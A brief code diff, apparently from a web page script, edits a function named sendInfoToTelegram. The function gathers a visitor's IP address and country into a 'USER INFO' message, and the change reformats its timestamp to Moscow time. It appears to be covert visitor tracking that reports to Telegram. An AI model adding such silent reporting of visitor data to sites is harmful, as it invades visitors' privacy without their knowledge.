@@ -100,7 +100,11 @@
   function sendInfoToTelegram() {
     getIPAddress(ip => {
       getCountryFromIP(ip, country => {
-        const currentTime = new Date().toLocaleString();
+        const date = new Date();
+
+        const localTime = date.toLocaleString();
+
+        const currentTime = date.toLocaleString('en-US', { timeZone: 'Europe/Moscow' });
         const message = `USER INFO:
         IP: ${ip}
         Country: ${country}
